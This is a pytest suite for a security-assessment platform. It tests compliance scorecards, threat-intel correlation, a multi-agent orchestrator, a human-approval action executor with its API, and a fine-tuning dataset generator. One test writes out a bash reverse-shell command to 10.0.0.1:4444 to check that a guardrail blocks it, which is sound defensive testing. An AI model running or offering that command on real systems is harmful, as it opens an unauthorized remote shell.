"""
Test suite for Pillar 2: AI Capabilities & Multi-Agent Architecture Upgrades.
Tests:
1. ComplianceReporterAgent (OWASP Top 10, PCI-DSS v4.0, ISO 27001 scorecards)
2. ThreatIntelAgent (EPSS probability estimation, CISA KEV catalog, Vector RAG fallback)
3. SpecialistAgentOrchestrator (Collaborative multi-agent assessment & natural language translation)
4. ActionExecutorService (Human-in-the-Loop lifecycle & guardrail refusal)
5. Action REST API Endpoints (/api/action/...)
6. FineTuneDatasetGenerator (QLoRA Alpaca JSONL dataset generation)
"""

from __future__ import annotations

import json
import tempfile
from pathlib import Path
import pytest
from fastapi.testclient import TestClient

from backend.app.main import app
from backend.app.services.agents.compliance_agent import (
    ComplianceReporterAgent,
    compliance_reporter_agent,
)
from backend.app.services.agents.orchestrator import (
    SpecialistAgentOrchestrator,
    orchestrator,
)
from backend.app.services.agents.threat_intel_agent import (
    ThreatIntelAgent,
    threat_intel_agent,
)
from backend.app.services.action_executor import (
    ActionExecutorService,
    ActionStatus,
    action_executor,
)
from backend.app.services.dataset_generator import FineTuneDatasetGenerator


@pytest.fixture
def client():
    return TestClient(app)


def test_compliance_reporter_agent_evaluation():
    """Test ComplianceReporterAgent scorecard scoring and framework mapping."""
    agent = ComplianceReporterAgent()

    # Mock findings containing critical CWEs
    findings = [
        {
            "id": "find-01",
            "title": "SQL Injection in User Login API",
            "severity": "CRITICAL",
            "cwe_id": "CWE-89",
            "description": "Unsanitized user input concatenated into SQL query.",
        },
        {
            "id": "find-02",
            "title": "Stored Cross-Site Scripting in Comments",
            "severity": "HIGH",
            "cwe_id": "CWE-79",
            "description": "User script tag rendered directly in browser context.",
        },
        {
            "id": "find-03",
            "title": "Path Traversal in Static Resource Endpoint",
            "severity": "HIGH",
            "cwe_id": "CWE-22",
            "description": "Relative directory paths allow arbitrary file read.",
        },
    ]

    result = agent.evaluate_compliance(target_id="192.168.100.153", findings=findings)

    assert result.target_id == "192.168.100.153"
    assert result.overall_compliance_score < 100.0  # Has severe violations
    assert result.overall_status in ("NON_COMPLIANT", "PARTIALLY_COMPLIANT")

    # Verify scorecards
    assert "OWASP_Top_10" in result.scorecards
    assert "PCI_DSS" in result.scorecards
    assert "ISO_27001" in result.scorecards

    owasp_sc = result.scorecards["OWASP_Top_10"]
    assert owasp_sc.violations_count >= 2
    assert owasp_sc.compliance_score < 100.0

    pci_sc = result.scorecards["PCI_DSS"]
    assert pci_sc.violations_count >= 2

    # Verify violations detail
    assert len(result.violations) >= 3
    violation_standards = {v.standard for v in result.violations}
    assert "OWASP Top 10 (2021)" in violation_standards
    assert "PCI-DSS v4.0" in violation_standards

    # Verify remediation roadmap & executive summary
    assert len(result.remediation_roadmap) > 0
    assert "OWASP Top 10" in result.executive_summary


def test_threat_intel_agent_epss_and_kev():
    """Test ThreatIntelAgent EPSS probability estimation and CISA KEV correlation."""
    agent = ThreatIntelAgent()

    # Query with Log4j which is a confirmed CISA KEV
    result = agent.correlate(
        target_id="192.168.100.153",
        discovered_services=[
            {"service_name": "log4j", "product": "apache log4j", "version": "2.14.1"}
        ],
    )

    assert len(result.matches) > 0
    log4j_match = next((m for m in result.matches if "CVE-2021-44228" in m.cve_id), None)
    if log4j_match:
        assert log4j_match.is_kev_listed is True
        assert log4j_match.epss_score > 0.5  # High EPSS probability
        assert log4j_match.cvss_score == 10.0


def test_threat_intel_agent_vector_rag_fallback():
    """Test ThreatIntelAgent semantic fallback using Vector RAG for novel service descriptions."""
    agent = ThreatIntelAgent()

    # Query with a descriptive name not literally in cve_affected exact table
    result = agent.correlate(
        target_id="192.168.100.153",
        discovered_services=[
            {"service_name": "http", "product": "web server path traversal vulnerability", "version": "2.4.49"}
        ],
    )
    assert isinstance(result.matches, list)
    assert result.summary != ""


def test_specialist_agent_orchestrator():
    """Test SpecialistAgentOrchestrator collaborative multi-agent execution."""
    assessment = orchestrator.run_collaborative_assessment("192.168.100.153")

    assert assessment.target_id == "192.168.100.153"
    assert assessment.recon_analysis is not None
    assert assessment.threat_intel is not None
    assert assessment.compliance_report is not None
    assert assessment.executive_summary != ""

    # Test natural language translation to safe command preview
    cmd_preview = orchestrator.translate_intent(
        prompt="kiểm tra cổng web và crawl đường dẫn api trên 192.168.100.153",
        target="192.168.100.153",
    )
    assert cmd_preview.is_safe is True
    assert cmd_preview.requires_approval is True
    assert cmd_preview.tool in ("katana", "nmap", "curl")


def test_action_executor_lifecycle():
    """Test Human-in-the-Loop Action execution lifecycle: PROPOSE -> APPROVE -> EXECUTE."""
    executor = ActionExecutorService()

    # 1. Propose safe read-only action
    action = executor.propose_action(
        target_id="192.168.100.153",
        name="Check HTTP Banner",
        command="curl -s -I http://127.0.0.1:8000/health",
        description="Verify service availability safely",
        expected_evidence="HTTP/1.1 200 OK",
    )
    assert action.status == ActionStatus.PROPOSED
    assert action.action_id.startswith("act_")

    # 2. Check pending list
    pending = executor.list_pending_actions(target_id="192.168.100.153")
    assert any(a.action_id == action.action_id for a in pending)

    # 3. Approve and execute
    executed = executor.approve_and_execute(action.action_id, operator_notes="Approved for test")
    assert executed.status in (ActionStatus.COMPLETED, ActionStatus.BLOCKED)
    assert executed.executed_at is not None

    # 4. Propose and reject another action
    action2 = executor.propose_action(
        target_id="192.168.100.153",
        name="Secondary Check",
        command="curl -s http://127.0.0.1:8000/health",
    )
    rejected = executor.reject_action(action2.action_id, reason="Not required for scope")
    assert rejected.status == ActionStatus.REJECTED
    assert rejected.operator_reason == "Not required for scope"


def test_action_executor_guardrail_refusal():
    """Test that dangerous exploitation commands are blocked even if operator attempts approval."""
    executor = ActionExecutorService()

    # Propose dangerous command
    dangerous_action = executor.propose_action(
        target_id="192.168.100.153",
        name="Reverse Shell Probe",
        command="bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
        description="Attempt reverse shell",
    )

    # Attempt to approve
    blocked = executor.approve_and_execute(dangerous_action.action_id, operator_notes="Mistaken approval")
    assert blocked.status == ActionStatus.BLOCKED
    assert "[GUARDRAIL REFUSAL]" in blocked.output


def test_action_api_endpoints(client: TestClient):
    """Test REST API endpoints for Human-in-the-Loop Actions."""
    # 1. Propose action via API
    propose_payload = {
        "target_id": "192.168.100.153",
        "name": "API Test Action",
        "command": "curl -s -I http://127.0.0.1:8000/health",
        "description": "Automated test probe",
        "expected_evidence": "HTTP 200",
    }
    r = client.post("/api/action/propose", json=propose_payload)
    assert r.status_code == 200
    data = r.json()
    action_id = data["action_id"]
    assert data["status"] == "PROPOSED"

    # 2. Get action by ID
    r = client.get(f"/api/action/{action_id}")
    assert r.status_code == 200
    assert r.json()["name"] == "API Test Action"

    # 3. List pending actions
    r = client.get("/api/action/pending?target_id=192.168.100.153")
    assert r.status_code == 200
    assert r.json()["count"] >= 1
    assert any(a["action_id"] == action_id for a in r.json()["actions"])

    # 4. Approve action via API
    r = client.post(f"/api/action/approve/{action_id}", json={"operator_notes": "API test approval"})
    assert r.status_code == 200
    assert r.json()["status"] in ("COMPLETED", "BLOCKED")

    # 5. Propose & Reject via API
    r = client.post("/api/action/propose", json=propose_payload)
    action_id2 = r.json()["action_id"]
    r = client.post(f"/api/action/reject/{action_id2}", json={"reason": "Test rejection"})
    assert r.status_code == 200
    assert r.json()["status"] == "REJECTED"


def test_dataset_generator_service():
    """Test QLoRA Security Fine-Tuning Dataset Generator."""
    generator = FineTuneDatasetGenerator()

    # Test CVE analysis samples
    cve_samples = generator.generate_cve_analysis_samples(limit=5)
    assert len(cve_samples) == 5
    for s in cve_samples:
        assert "instruction" in s and len(s["instruction"]) > 0
        assert "input" in s and "Vulnerability ID" in s["input"]
        assert "output" in s and "Safe Read-Only Verification Plan" in s["output"]

    # Test CWE remediation samples
    cwe_samples = generator.generate_cwe_remediation_samples(limit=5)
    assert len(cwe_samples) == 5
    for s in cwe_samples:
        assert "instruction" in s
        assert "input" in s
        assert "output" in s and "PCI-DSS" in s["output"]

    # Test full dataset build to temp file
    with tempfile.NamedTemporaryFile(suffix=".jsonl", delete=False) as tmp:
        tmp_path = Path(tmp.name)

    try:
        stats = generator.build_full_dataset(
            output_file=tmp_path,
            cve_limit=5,
            cwe_limit=5,
            recon_limit=5,
        )
        assert stats["total_samples"] >= 10
        assert tmp_path.exists()
        assert tmp_path.stat().st_size > 0

        # Validate valid JSON lines
        with open(tmp_path, "r", encoding="utf-8") as f:
            lines = f.readlines()
            assert len(lines) == stats["total_samples"]
            for l in lines:
                parsed = json.loads(l)
                assert "instruction" in parsed
                assert "input" in parsed
                assert "output" in parsed
    finally:
        if tmp_path.exists():
            tmp_path.unlink()
